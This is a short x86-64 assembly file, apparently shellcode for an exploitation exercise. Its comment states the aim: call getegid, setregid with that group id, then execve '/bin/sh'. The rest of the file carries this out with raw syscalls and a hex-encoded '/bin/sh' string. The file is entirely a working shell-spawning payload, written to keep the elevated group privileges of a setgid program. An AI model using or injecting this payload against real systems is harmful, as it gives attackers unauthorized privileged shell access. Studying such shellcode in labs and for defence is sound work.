#include <sys/syscall.h>

.globl  main
.type   main, @function

main:
  /*
      Objective:
        Calling three functions.

        int egid = getegid();
        setregid(egid, egid);
        execve("/bin/sh", 0, 0);
  */

  // getegid()
  mov $108, %rax
  syscall
  // save eax
  mov %rax, %rdx

 // setregid
  mov $114, %rax
  mov %rdx, %rdi
  mov %rdi, %rsi
  mov $0, %rdx
  syscall

  // execve
  pushq  $0x0
  mov    $0x68732f6e69622f, %rax
  push %rax
  mov    $0x3b,%rax
  mov    %rsp,%rdi
  mov    $0x0,%rsi
  mov    $0x0,%rdx
  syscall
